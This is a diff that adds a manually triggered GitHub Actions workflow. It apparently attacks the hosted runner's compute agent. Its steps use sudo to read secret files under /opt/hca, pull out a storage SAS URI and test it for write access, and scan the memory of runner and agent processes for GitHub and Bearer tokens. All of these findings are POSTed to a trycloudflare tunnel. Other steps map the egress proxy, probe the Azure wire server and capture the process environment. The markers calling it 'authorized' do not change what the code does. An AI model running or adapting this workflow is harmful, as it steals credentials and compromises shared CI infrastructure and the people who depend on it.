@@ -1,0 +1,116 @@
+name: r9b-hca-secrets-and-sas-repro
+on:
+  workflow_dispatch:
+env:
+  TUNNEL: https://admitted-isp-museum-becomes.trycloudflare.com
+jobs:
+  r9b:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: P-A locate and ship /opt/hca secret-bearing files (full content to tunnel only)
+        run: |
+          send() { curl -sS -m 20 --data-binary @"$1" -H 'Content-Type: text/plain' -X POST "$TUNNEL/r9b-ingest?file=$2" >/dev/null 2>&1 || true; }
+          for F in /opt/hca/.settings /opt/hca/diagnostics.json /opt/hca/provjobd_override.json /opt/hca/actions-egress-proxy.version /opt/hca/logs/hosted-compute-agent.log; do
+            if sudo test -f "$F"; then
+              sudo cat "$F" > /tmp/r9b-file 2>/dev/null
+              echo "$F: $(wc -c < /tmp/r9b-file) bytes sha256=$(sha256sum /tmp/r9b-file | cut -d' ' -f1)"
+              send /tmp/r9b-file "$(basename $F)"
+            else
+              echo "$F: absent"
+            fi
+          done
+          echo "== which /opt/hca files contain sasUri =="
+          sudo grep -l "sasUri" /opt/hca/.settings /opt/hca/diagnostics.json /opt/hca/provjobd_override.json 2>/dev/null || echo "none of the known files (checking full tree)"
+          sudo grep -rl "sasUri" /opt/hca 2>/dev/null | head -5
+
+      - name: P-B SAS write reproduction (status codes only in log)
+        run: |
+          SASFILE=$(sudo grep -rl "sasUri" /opt/hca 2>/dev/null | head -1)
+          if [ -z "$SASFILE" ]; then echo "no sasUri found this boot"; exit 0; fi
+          echo "sas source file: $SASFILE"
+          SAS=$(sudo cat "$SASFILE" | grep -oE 'https://[^"]+' | head -1)
+          echo "$SAS" > /tmp/r9b-sas; curl -sS -m 20 --data-binary @/tmp/r9b-sas -X POST "$TUNNEL/r9b-ingest?file=sasUri" >/dev/null 2>&1 || true
+          BASE=$(echo "$SAS" | cut -d'?' -f1); PARAMS=$(echo "$SAS" | cut -d'?' -f2)
+          BLOB="r9b-marker-$(date -u +%Y%m%dT%H%M%SZ).txt"
+          echo "== PUT marker blob (expect 201 if SAS grants create/write) =="
+          curl -sS -m 15 -o /tmp/r9b-put -w 'PUT-status:%{http_code}\n' -X PUT "$BASE/$BLOB?$PARAMS" \
+            -H 'x-ms-blob-type: BlockBlob' -H 'Content-Type: text/plain' \
+            --data-binary "r9b engagement marker $(date -u +%FT%TZ) authorized probe" 2>&1 | tail -1
+          echo "== LIST container (expect 403 without l permission) =="
+          curl -sS -m 15 -o /tmp/r9b-list -w 'LIST-status:%{http_code}\n' "$BASE?$PARAMS&restype=container&comp=list" 2>&1 | tail -1
+          echo "== second PUT same blob (overwrite semantics) =="
+          curl -sS -m 15 -o /dev/null -w 'PUT2-status:%{http_code}\n' -X PUT "$BASE/$BLOB?$PARAMS" \
+            -H 'x-ms-blob-type: BlockBlob' --data-binary "r9b overwrite probe" 2>&1 | tail -1
+          echo "(response bodies shipped to tunnel, not log)"
+          cat /tmp/r9b-put /tmp/r9b-list 2>/dev/null | head -c 1500 > /tmp/r9b-bodies
+          curl -sS -m 20 --data-binary @/tmp/r9b-bodies -X POST "$TUNNEL/r9b-ingest?file=sas-bodies" >/dev/null 2>&1 || true
+
+      - name: P-C heap scan v2 (all rw anon maps, hits to tunnel)
+        run: |
+          echo "yama ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
+          sudo python3 - <<'EOF'
+          import re, subprocess, urllib.request
+          TUN = "https://admitted-isp-museum-becomes.trycloudflare.com"
+          pats = re.compile(rb'(ghu_[A-Za-z0-9]{20,}|ghs_[A-Za-z0-9]{20,}|gho_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|Bearer [A-Za-z0-9._-]{25,}|sasUri|\.github\.net[A-Za-z0-9._/-]*|SharedAccessSignature)')
+          pids = [int(p) for p in subprocess.run(['pgrep','-f','Runner.Listener|Runner.Worker|hosted-compute-agent|provjobd'], capture_output=True, text=True).stdout.split()][:8]
+          for pid in pids:
+              try:
+                  comm = open(f'/proc/{pid}/comm').read().strip()
+                  print(f'== pid {pid} ({comm}) anon-heap scan ==')
+                  total = 0; hits = []
+                  for line in open(f'/proc/{pid}/maps'):
+                      m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (....) [0-9a-f]+ [0-9a-f]+ [0-9a-f]+\s+\d+\s*(.*)', line)
+                      if not m or 'r' not in m.group(3) or 'w' not in m.group(3): continue
+                      path = m.group(4).strip()
+                      if path and not path.startswith('[heap]'): continue
+                      lo, hi = int(m.group(1),16), int(m.group(2),16)
+                      if hi - lo > 256*1024*1024 or total > 768*1024*1024: continue
+                      try:
+                          fd = open(f'/proc/{pid}/mem','rb',buffering=0); fd.seek(lo); data = fd.read(hi-lo); fd.close()
+                      except Exception: continue
+                      total += len(data)
+                      for mm in pats.finditer(data):
+                          val = mm.group(0)[:200].decode('utf-8','replace')
+                          hits.append(f'pid {pid} ({comm}) HIT: {val}')
+                  for h in hits: print('  ' + h[:60] + ('...' if len(h)>60 else ''))
+                  if hits:
+                      body = ('\n'.join(hits)).encode()
+                      req = urllib.request.Request(f'{TUN}/r9b-ingest?file=heapscan-{pid}', data=body, method='POST')
+                      try: urllib.request.urlopen(req, timeout=20)
+                      except Exception as e: print(f'  tunnel send fail: {e}')
+              except Exception as e:
+                  print(f'pid {pid} error: {e}')
+          EOF
+
+      - name: P-D egress proxy intel
+        run: |
+          echo "== proxy/dns units =="
+          systemctl list-units --all 2>/dev/null | grep -iE 'proxy|dns|hca' | head -10
+          echo "== listeners =="
+          sudo ss -tlnp 2>/dev/null | grep -vE '127.0.0.53|:22 ' | head -15
+          echo "== outbound-proxy config paths in binary =="
+          sudo strings -a /opt/hca/outbound-proxy 2>/dev/null | grep -oE '/[a-z0-9._/-]+\.(json|yaml|yml|conf|toml)' | sort -u | head -10
+          echo "== outbound-proxy url/host strings =="
+          sudo strings -a /opt/hca/outbound-proxy 2>/dev/null | grep -oE 'https?://[a-zA-Z0-9._:/-]+' | sort -u | head -15
+          sudo cat /opt/hca/outbound-proxy.version 2>/dev/null
+
+      - name: P-E net-reach (tolerant)
+        run: |
+          curl -m 4 -sS -o /dev/null -w 'wire-server-http:%{http_code}\n' http://168.63.129.16/ 2>&1 || echo "wire-server-http:timeout"
+          curl -m 4 -sSk -o /dev/null -w 'wire-server-https:%{http_code}\n' https://168.63.129.16/ 2>&1 || echo "wire-server-https:timeout"
+          echo "== neighbors =="
+          ip neigh show 2>/dev/null | head -10 || true
+          echo "== routes =="
+          ip -4 route show 2>/dev/null | head -8 || true
+
+      - name: P-F capture action-process env (to tunnel only)
+        uses: ./actions/r9-capture
+
+      - name: upload non-secret evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: r9b-evidence
+          path: ${{ runner.temp }}/r9-mark.txt
